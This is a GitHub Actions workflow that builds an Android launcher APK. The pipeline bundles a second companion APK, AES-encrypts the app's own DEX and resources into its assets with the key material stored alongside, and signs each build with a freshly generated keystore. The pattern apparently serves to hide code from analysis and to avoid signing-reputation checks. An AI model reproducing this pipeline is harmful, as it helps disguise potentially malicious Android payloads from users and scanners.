name: Build Nova Launcher APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    name: Build & Encrypt & Sign Nova APK
    runs-on: ubuntu-latest

    steps:

      # ── Step 1: Checkout ────────────────────────────────────────────────────
      - name: Checkout Repository
        uses: actions/checkout@v4

      # ── Step 2: Verify companion.apk ────────────────────────────────────────
      - name: Verify companion.apk exists
        run: |
          if [ ! -f app/src/main/assets/companion.apk ]; then
            echo "[X] companion.apk missing from assets!"
            exit 1
          fi
          echo "[OK] companion.apk found ($(du -h app/src/main/assets/companion.apk | cut -f1))"

      # ── Step 3: Setup JDK ───────────────────────────────────────────────────
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      # ── Step 4: Setup Android SDK ───────────────────────────────────────────
      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      # ── Step 5: Install Tools ───────────────────────────────────────────────
      - name: Install Required Tools
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y zipalign apksigner python3 openssl
          echo "[OK] Tools installed"

      # ── Step 6: Cache Gradle ────────────────────────────────────────────────
      - name: Cache Gradle wrapper
        uses: actions/cache@v4
        with:
          path: gradle/wrapper/gradle-wrapper.jar
          key: gradle-wrapper-${{ runner.os }}

      # ── Step 7: Grant Gradle Permission ────────────────────────────────────
      - name: Grant gradlew permission
        run: chmod +x gradlew

      # ── Step 8: Build Full Nova APK ─────────────────────────────────────────
      - name: Build Release APK
        run: ./gradlew assembleRelease --stacktrace --no-daemon -x lint -x lintVitalRelease

      # ── Step 9: Extract Real Files From APK ────────────────────────────────
      - name: Extract Real Files From APK
        run: |
          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          echo "[OK] Found APK: $APK"
          mkdir -p /tmp/apk_extracted
          unzip -q "$APK" -d /tmp/apk_extracted
          echo "[OK] APK extracted"

          # Extract classes.dex
          if [ -f /tmp/apk_extracted/classes.dex ]; then
            cp /tmp/apk_extracted/classes.dex /tmp/classes.dex
            echo "[OK] classes.dex extracted ($(du -h /tmp/classes.dex | cut -f1))"
          fi

          # Zip res/ folder
          if [ -d /tmp/apk_extracted/res ]; then
            cd /tmp/apk_extracted && zip -q -r /tmp/res.zip res/
            echo "[OK] res.zip created ($(du -h /tmp/res.zip | cut -f1))"
          fi

          # Extract resources.arsc
          if [ -f /tmp/apk_extracted/resources.arsc ]; then
            cp /tmp/apk_extracted/resources.arsc /tmp/resources.arsc
            echo "[OK] resources.arsc extracted ($(du -h /tmp/resources.arsc | cut -f1))"
          fi

      # ── Step 10: Encrypt Files ──────────────────────────────────────────────
      - name: Encrypt Files With AES-256
        run: |
          pip3 install cryptography --break-system-packages -q

          cat > /tmp/nova_encrypt.py << 'ENDOFSCRIPT'
import os, secrets, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

MAGIC        = b'NOVA'
VERSION      = b'\x01'
SALT_LEN     = 32
IV_LEN       = 16
PBKDF2_ITER  = 310000
BUILD_PREFIX = "CrystalSoft-Nova-"

def derive_key(build_id, salt):
    base = (BUILD_PREFIX + build_id).encode()
    return hashlib.pbkdf2_hmac('sha256', base, salt, PBKDF2_ITER, dklen=32)

def encrypt_file(input_path, output_path, key, salt):
    if not os.path.exists(input_path):
        print("[SKIP] " + input_path + " not found")
        return
    iv = secrets.token_bytes(IV_LEN)
    with open(input_path, 'rb') as f:
        data = f.read()
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len] * pad_len)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    encrypted = enc.update(data) + enc.finalize()
    with open(output_path, 'wb') as f:
        f.write(MAGIC + VERSION + salt + iv + encrypted)
    print("[OK] Encrypted: " + input_path + " -> " + output_path)

salt     = secrets.token_bytes(SALT_LEN)
build_id = secrets.token_hex(16)
key      = derive_key(build_id, salt)
key_fp   = hashlib.sha256(key).hexdigest()

encrypt_file('/tmp/classes.dex',    '/tmp/classes.enc',   key, salt)
encrypt_file('/tmp/res.zip',        '/tmp/res.enc',        key, salt)
encrypt_file('/tmp/resources.arsc', '/tmp/resources.enc',  key, salt)

with open('/tmp/build.meta', 'w') as f:
    f.write("BUILD_ID=" + build_id + "\n")
    f.write("KEY_FP="   + key_fp   + "\n")
    f.write("SALT="     + salt.hex() + "\n")

print("[OK] Build ID       : " + build_id)
print("[OK] Key fingerprint: " + key_fp)
ENDOFSCRIPT

          python3 /tmp/nova_encrypt.py
          echo "[OK] Encryption complete"

      # ── Step 11: Inject .enc Files Into APK Assets ──────────────────────────
      - name: Inject Encrypted Files Into APK Assets
        run: |
          mkdir -p app/src/main/assets

          # Copy .enc files into assets (companion.apk stays untouched)
          [ -f /tmp/classes.enc ]    && cp /tmp/classes.enc    app/src/main/assets/
          [ -f /tmp/res.enc ]        && cp /tmp/res.enc        app/src/main/assets/
          [ -f /tmp/resources.enc ]  && cp /tmp/resources.enc  app/src/main/assets/
          [ -f /tmp/build.meta ]     && cp /tmp/build.meta     app/src/main/assets/

          echo "[OK] Assets folder contents:"
          ls -lh app/src/main/assets/

      # ── Step 12: Rebuild APK With Encrypted Assets ──────────────────────────
      - name: Rebuild APK With Encrypted Assets
        run: |
          ./gradlew assembleRelease --no-daemon -x lint
          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          echo "[OK] Rebuilt APK: $APK ($(du -h $APK | cut -f1))"

      # ── Step 13: Generate Fresh Professional Keystore ───────────────────────
      - name: Generate Fresh Professional Keystore
        run: |
          # Python for reliable password gen
          python3 -c 'import secrets,string,os; chars=string.ascii_letters+string.digits; kp="".join(secrets.choice(chars) for _ in range(28)); vp="".join(secrets.choice(chars) for _ in range(28)); open("/tmp/ks_creds.env","w").write("KS_PASS="+kp+"\nKEY_PASS="+vp+"\n"); print("[OK] Passwords generated")'
          source /tmp/ks_creds.env
          BUILD_TS=$(date +%Y%m%d%H%M%S)
          ALIAS="crystalsoft_${BUILD_TS}"

          keytool -genkeypair \
            -keystore /tmp/nova_build.jks \
            -storetype PKCS12 \
            -alias "$ALIAS" \
            -keyalg RSA \
            -keysize 4096 \
            -validity 9125 \
            -sigalg SHA256withRSA \
            -dname "EMAILADDRESS=dev@crystalsoft.io, CN=Crystal Software, OU=Mobile Engineering, O=CrystalSoft Technologies Ltd, L=Austin, ST=Texas, C=US" \
            -storepass "$KS_PASS" \
            -keypass "$KEY_PASS" \
            -noprompt

          # Verify keystore is readable with the generated password
          keytool -list \
            -keystore /tmp/nova_build.jks \
            -storetype PKCS12 \
            -storepass "$KS_PASS" \
            -noprompt
          echo "[OK] Keystore verified"

          echo "KS_ALIAS=$ALIAS"    >> $GITHUB_ENV
          echo "KS_PASS=$KS_PASS"   >> $GITHUB_ENV
          echo "KEY_PASS=$KEY_PASS" >> $GITHUB_ENV
          echo "[OK] Keystore generated: $ALIAS"

      # ── Step 14: Zipalign ───────────────────────────────────────────────────
      - name: Zipalign APK
        run: |
          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          zipalign -v -p 4 "$APK" /tmp/nova_aligned.apk
          echo "[OK] Zipalign complete"

      # ── Step 15: Sign With V2 + V3 (apksigner only) ─────────────────────────
      - name: Sign APK V2 + V3
        run: |
          apksigner sign \
            --ks /tmp/nova_build.jks \
            --ks-key-alias "$KS_ALIAS" \
            --ks-pass "pass:$KS_PASS" \
            --key-pass "pass:$KEY_PASS" \
            --v1-signing-enabled false \
            --v2-signing-enabled true \
            --v3-signing-enabled true \
            --out /tmp/nova_signed.apk \
            /tmp/nova_aligned.apk

          echo "[OK] APK signed successfully"

          # Verify signature
          apksigner verify --print-certs /tmp/nova_signed.apk
          echo "[OK] Signature verified"

      # ── Step 16: Show Final APK Info ────────────────────────────────────────
      - name: Show Final APK Info
        if: success()
        run: |
          echo "==== FINAL APK INFO ===="
          echo "Size: $(du -h /tmp/nova_signed.apk | cut -f1)"
          echo "DEX files:"
          unzip -l /tmp/nova_signed.apk | grep "\.dex"
          echo "Assets:"
          unzip -l /tmp/nova_signed.apk | grep "assets/"
          echo "META-INF:"
          unzip -l /tmp/nova_signed.apk | grep "META-INF"

      # ── Step 17: Upload Final Signed APK ────────────────────────────────────
      - name: Upload Signed APK
        uses: actions/upload-artifact@v4
        with:
          name: nova-launcher-release
          path: /tmp/nova_signed.apk
          retention-days: 1
          overwrite: true

      # ── Step 18: Cleanup Sensitive Files (after upload) ─────────────────────
      - name: Cleanup Sensitive Files
        if: always()
        run: |
          rm -f /tmp/nova_build.jks /tmp/ks_creds.env
          rm -f /tmp/classes.dex /tmp/res.zip /tmp/resources.arsc
          rm -f /tmp/classes.enc /tmp/res.enc /tmp/resources.enc
          rm -rf /tmp/apk_extracted
          echo "[OK] All sensitive temp files deleted"

      # ── Step 19: Collect Error Logs On Failure ──────────────────────────────
      - name: Collect Error Logs
        if: failure()
        run: |
          mkdir -p /tmp/error_report
          # Gradle build logs
          find . -path "*/build/reports" -type d | while read dir; do
            cp -r "$dir" /tmp/error_report/ 2>/dev/null || true
          done
          # Lint reports
          find . -name "lint-results*.xml" -o -name "lint-results*.html" 2>/dev/null \
            | xargs -I{} cp {} /tmp/error_report/ 2>/dev/null || true
          # Gradle stacktrace logs
          find . -name "*.log" 2>/dev/null \
            | xargs -I{} cp {} /tmp/error_report/ 2>/dev/null || true
          # Manifest snapshot
          cp app/src/main/AndroidManifest.xml /tmp/error_report/ 2>/dev/null || true
          # Summary file
          echo "Build failed at: $(date)" > /tmp/error_report/FAILURE_SUMMARY.txt
          echo "Runner OS: $RUNNER_OS" >> /tmp/error_report/FAILURE_SUMMARY.txt
          echo "GitHub SHA: $GITHUB_SHA" >> /tmp/error_report/FAILURE_SUMMARY.txt
          echo "Workflow: $GITHUB_WORKFLOW" >> /tmp/error_report/FAILURE_SUMMARY.txt
          echo "[OK] Error report collected"

      - name: Upload Error Report ZIP
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: build-error-report-${{ github.run_number }}
          path: /tmp/error_report/
          retention-days: 7
          overwrite: true
